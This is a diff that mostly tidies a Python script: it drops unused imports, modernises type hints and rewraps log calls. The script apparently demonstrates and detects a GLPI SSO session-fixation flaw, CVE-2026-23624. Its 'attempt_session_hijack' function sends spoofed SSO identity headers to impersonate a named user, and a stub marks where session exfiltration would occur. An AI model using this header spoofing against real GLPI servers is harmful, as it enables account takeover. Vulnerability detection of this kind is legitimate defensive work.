@@ -3,12 +3,10 @@
 # detecting anomalous session reuse across shared workstations.
 # Mirrors the logic described in CVE-2026-23624 for detection purposes.
 
-import os
-import sys
-import requests
-import http.cookiejar
 import logging
-from typing import Optional
+import sys
+
+import requests
 
 logging.basicConfig(
     level=logging.INFO,
@@ -29,7 +27,7 @@ SSO_EMAIL_HEADER = "HTTP_SHIB_INETORGPERSON_MAIL"
 DEMO_API_TOKEN = "DEMO_PLACEHOLDER_TOKEN"
 
 
-def build_sso_headers(username: str, email: Optional[str] = None) -> dict:
+def build_sso_headers(username: str, email: str | None = None) -> dict:
     """
     Construct the HTTP headers that a GLPI server configured for remote
     (SSO) authentication inspects to identify the calling user.
@@ -49,7 +47,7 @@ def build_sso_headers(username: str, email: Optional[str] = None) -> dict:
     return headers
 
 
-def attempt_session_hijack(target_username: str) -> Optional[str]:
+def attempt_session_hijack(target_username: str) -> str | None:
     """
     Demonstrate (neutered) the session-fixation vector:
 
@@ -67,9 +65,7 @@ def attempt_session_hijack(target_username: str) -> Optional[str]:
         email=f"{target_username}@example.org",
     )
 
-    log.info(
-        "Sending SSO-spoofed initSession request for user=%r", target_username
-    )
+    log.info("Sending SSO-spoofed initSession request for user=%r", target_username)
 
     try:
         response = requests.get(
@@ -78,9 +74,7 @@ def attempt_session_hijack(target_username: str) -> Optional[str]:
             timeout=10,
         )
     except requests.ConnectionError:
-        log.warning(
-            "Could not reach %s — is the demo server running?", GLPI_BASE_URL
-        )
+        log.warning("Could not reach %s — is the demo server running?", GLPI_BASE_URL)
         # Neutered: in a real scenario this is where stolen session
         # data would be captured and exfiltrated.
         print("[DEMO] Would exfiltrate session token here — payload neutered.")
@@ -125,8 +119,11 @@ def check_vulnerable_endpoint(base_url: str = GLPI_BASE_URL) -> bool:
             log.warning("Instance at %s appears VULNERABLE (CVE-2026-23624)", base_url)
             return True
         else:
-            log.info("Instance at %s returned %d — likely patched or not SSO-enabled",
-                     base_url, resp.status_code)
+            log.info(
+                "Instance at %s returned %d — likely patched or not SSO-enabled",
+                base_url,
+                resp.status_code,
+            )
             return False
     except requests.ConnectionError:
         log.error("Connection failed to %s", base_url)
